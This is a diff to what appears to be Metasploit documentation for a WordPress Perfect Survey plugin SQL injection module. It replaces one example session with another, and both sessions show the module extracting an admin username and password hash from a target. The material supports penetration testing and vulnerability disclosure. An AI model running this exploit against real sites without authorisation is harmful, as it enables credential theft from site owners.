@@ -34,20 +34,18 @@ Default is `false`.
 ```plaintext
 msf6 > use auxiliary/scanner/http/wp_perfect_survey_sqli
 [*] Using auxiliary/scanner/http/wp_perfect_survey_sqli
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set rhosts 1.1.1.1
-rhosts => 1.1.1.1
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set verbose true
-verbose => true
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > check
-
-[*] Sending HTTP GET request to check the plugin version...
-[*] The target appears to be running Perfect Survey plugin version 1.5.1.
-[+] The target appears to be vulnerable.
-msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > run
+msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RHOSTS 192.168.1.104
+RHOSTS => 192.168.1.104
+msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set RPORT 8000
+RPORT => 8000
+msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > set TARGETURI /wordpress
+TARGETURI => /wordpress
+msf6 auxiliary(scanner/http/wp_perfect_survey_sqli) > exploit 
+[*] Running module against 192.168.1.104
 
 [*] Exploiting SQLi in Perfect Survey plugin...
 [+] Received a response from the server!
-[+] Extracted Username: admin
-[+] Extracted Password Hash: $P$BPUcVygZO/z1DqvPoEYQILBgsyi7tf0
-[*] Auxiliary module execution completed.
+[+] Extracted Username: aaryan
+[+] Extracted Password Hash: $P$BroxbUQTM0N32U7JeMmkXPJrxN9ErZ1
+[*] Auxiliary module execution completed
 ```
